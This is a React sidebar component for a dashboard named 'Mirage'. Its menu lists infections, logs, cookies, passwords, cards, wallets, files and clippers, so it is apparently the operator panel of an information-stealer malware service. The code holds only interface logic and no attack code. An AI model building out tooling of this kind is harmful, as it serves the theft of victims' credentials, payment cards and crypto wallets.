import logo from '@/assets/logo.webp'
import { useState, useEffect, useCallback } from 'react'
import { NavLink, useLocation } from 'react-router-dom'
import { cn } from '@/lib/utils'
import { useI18n, type TranslationKey } from '@/lib/i18n'
import {
  LayoutDashboard, Database, Bug, Key, Cookie, CreditCard, Wallet, FileText,
  Scissors, LifeBuoy, ChevronLeft, ChevronRight,
} from 'lucide-react'

import { motion, AnimatePresence } from 'motion/react'

type NavItem = { to: string; label: TranslationKey; icon: typeof LayoutDashboard; end?: boolean }

const navItems: NavItem[] = [
  { to: '/', label: 'nav.dashboard', icon: LayoutDashboard, end: true },
  { to: '/sessions', label: 'nav.logs', icon: Database },
  { to: '/infections', label: 'nav.infections', icon: Bug },
  { to: '/cookies', label: 'nav.cookies', icon: Cookie },
  { to: '/passwords', label: 'nav.passwords', icon: Key },
  { to: '/cards', label: 'nav.cards', icon: CreditCard },
  { to: '/wallets', label: 'nav.wallets', icon: Wallet },
  { to: '/files', label: 'nav.files', icon: FileText },
  { to: '/clippers', label: 'nav.clippers', icon: Scissors },
  { to: '/support', label: 'nav.support', icon: LifeBuoy },
]

interface SidebarProps {
  open?: boolean
  onClose?: () => void
}

export function Sidebar({ open = false, onClose }: SidebarProps) {
  const { t } = useI18n()
  const location = useLocation()
  const [collapsed, setCollapsed] = useState(() => localStorage.getItem('sidebar_collapsed') === 'true')

  const toggle = useCallback(() => {
    setCollapsed(prev => {
      localStorage.setItem('sidebar_collapsed', String(!prev))
      return !prev
    })
  }, [])

  useEffect(() => {
    if (!open) return
    const handler = (e: KeyboardEvent) => { if (e.key === 'Escape') onClose?.() }
    window.addEventListener('keydown', handler)
    return () => window.removeEventListener('keydown', handler)
  }, [open, onClose])

  const sidebarContent = (
    <div className="flex flex-col h-full bg-sidebar">
      {/* Logo */}
      <div className={cn(
        'flex items-center shrink-0 h-16 transition-[padding] duration-200',
        collapsed ? 'justify-center px-0' : 'gap-3.5 px-5'
      )}>
        <img src={logo} alt="Mirage" className={cn('object-contain shrink-0', collapsed ? 'h-9 w-9' : 'h-10 w-10')} />
        {!collapsed && (
          <span className="font-display text-[16px] tracking-[-0.01em] text-foreground">
            Mirage
          </span>
        )}
      </div>

      <nav className="flex-1 py-4 overflow-y-auto">
        <div className="px-3 space-y-1">
          {navItems.map((item) => {
            const isActive = item.end
              ? location.pathname === item.to
              : location.pathname === item.to ||
                (item.to !== '/' && location.pathname.startsWith(item.to + '/'))

            return (
              <NavLink
                key={item.to}
                to={item.to}
                end={item.end}
                onClick={() => { if (open && onClose) onClose() }}
                aria-current={isActive ? 'page' : undefined}
                className={cn(
                  'group relative flex items-center rounded-lg transition-all duration-200 ease-out',
                  collapsed ? 'justify-center h-11 w-full' : 'gap-3 h-11 px-3',
                  isActive
                    ? 'bg-accent text-foreground'
                    : 'text-muted-foreground hover:bg-accent/50 hover:text-foreground active:scale-[0.98]',
                )}
                title={collapsed ? t(item.label) : undefined}
              >
                {isActive && (
                  <motion.span
                    layoutId="sidebar-active-marker"
                    className="absolute left-0 top-2 bottom-2 w-[2px] rounded-full bg-foreground"
                    transition={{ type: 'spring', stiffness: 380, damping: 30 }}
                  />
                )}
                <motion.span
                  whileHover={!isActive ? { scale: 1.08 } : undefined}
                  whileTap={{ scale: 0.92 }}
                  transition={{ type: 'spring', stiffness: 500, damping: 26 }}
                  className="flex items-center justify-center"
                >
                  <item.icon
                    strokeWidth={1.5}
                    className={cn(
                      'h-[18px] w-[18px] shrink-0 transition-colors duration-200',
                      isActive ? 'text-foreground' : 'text-muted-foreground group-hover:text-foreground',
                    )}
                  />
                </motion.span>
                {!collapsed && (
                  <span className="text-[13.5px] leading-none font-medium tracking-[-0.005em] truncate">
                    {t(item.label)}
                  </span>
                )}
              </NavLink>
            )
          })}
        </div>
      </nav>
      <button
        onClick={toggle}
        aria-label={collapsed ? t('common.expand_sidebar') : t('common.collapse_sidebar')}
        className="hidden lg:flex items-center justify-center h-11 text-muted-foreground hover:text-foreground hover:bg-accent/40 active:scale-[0.98] transition-all duration-200"
      >
        {collapsed ? <ChevronRight className="h-4 w-4" /> : <ChevronLeft className="h-4 w-4" />}
      </button>
    </div>
  )
  return (
    <>
      {/* Mobile backdrop */}
      <AnimatePresence>
        {open && (
          <motion.button
            type="button"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.25, ease: [0.2, 0.8, 0.2, 1] }}
            aria-label={t('common.close')}
            className="fixed inset-0 bg-black/55 backdrop-blur-sm z-40 lg:hidden cursor-default"
            onClick={onClose}
          />
        )}
      </AnimatePresence>

      {/* Sidebar */}
      <motion.aside
        initial={false}
        animate={{ width: collapsed ? 56 : 232 }}
        transition={{ type: 'spring', stiffness: 360, damping: 32 }}
        className={cn(
          'flex flex-col shrink-0 h-full overflow-hidden',
          'fixed inset-y-0 left-0 z-50 lg:relative lg:z-auto',
          open ? 'translate-x-0' : '-translate-x-full lg:translate-x-0',
        )}
      >
        {sidebarContent}
      </motion.aside>
    </>
  )
}
